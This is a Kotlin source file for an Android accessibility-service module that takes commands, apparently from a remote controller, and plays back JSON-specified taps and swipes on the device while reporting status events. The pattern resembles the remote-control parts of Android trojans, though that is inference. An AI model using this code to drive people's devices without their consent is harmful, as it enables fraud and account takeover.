package com.storm.safe.rock.service.modules.command

import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.os.Build
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.CopyOnWriteArrayList

class GestureCommandHandler : CommandHandler {
    companion object {
        private const val TAG = "GestureCmd"
    }

    private val recordedGestures = CopyOnWriteArrayList<JSONObject>()

    @Volatile
    private var isRecording = false

    override fun getSupportedCommands(): Set<String> = setOf(
        "START_GESTURE_RECORDING",
        "STOP_GESTURE_RECORDING",
        "PLAYBACK_GESTURE",
        "GET_GESTURE_RECORDING_STATUS",
        "RESET_GESTURE_RECORDING",
        "CLEAR_GESTURE_RECORDED_FLAG"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        when (command) {
            "START_GESTURE_RECORDING" -> {
                isRecording = true
                recordedGestures.clear()
                context.sendEvent("gesture_status", JSONObject().apply {
                    put("recording", true)
                })
            }
            "STOP_GESTURE_RECORDING" -> {
                isRecording = false
                context.sendEvent("gesture_status", JSONObject().apply {
                    put("recording", false)
                    put("count", recordedGestures.size)
                })
            }
            "PLAYBACK_GESTURE" -> {
                val gestures = params?.optJSONArray("gestures") ?: JSONArray()
                Log.i(TAG, "Playback ${gestures.length()} gestures")
                playbackGestures(gestures, context)
            }
            "GET_GESTURE_RECORDING_STATUS" -> {
                context.sendEvent("gesture_status", JSONObject().apply {
                    put("recording", isRecording)
                    put("count", recordedGestures.size)
                })
            }
            "RESET_GESTURE_RECORDING" -> {
                recordedGestures.clear()
                isRecording = false
                context.sendEvent("gesture_status", JSONObject().apply {
                    put("recording", false)
                    put("count", 0)
                })
            }
            "CLEAR_GESTURE_RECORDED_FLAG" -> {
                isRecording = false
            }
        }
    }

    private suspend fun playbackGestures(gestures: JSONArray, context: CommandContext) {
        val service = context.service ?: return
        if (Build.VERSION.SDK_INT < 24) return

        for (i in 0 until gestures.length()) {
            val g = gestures.optJSONObject(i) ?: continue
            val type = g.optString("type", "tap")
            val x = g.optDouble("x", 0.0).toFloat()
            val y = g.optDouble("y", 0.0).toFloat()
            val duration = g.optLong("duration", 100L)
            val delay = g.optLong("delay", 200L)

            val path = Path().apply { moveTo(x, y) }
            if (type == "swipe") {
                val x2 = g.optDouble("x2", x.toDouble()).toFloat()
                val y2 = g.optDouble("y2", y.toDouble()).toFloat()
                path.lineTo(x2, y2)
            }

            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, duration.coerceAtLeast(50)))
                .build()
            service.dispatchGesture(gesture, null, null)
            kotlinx.coroutines.delay(delay)
        }

        context.sendEvent("gesture_playback_complete", JSONObject().apply {
            put("count", gestures.length())
        })
    }
}
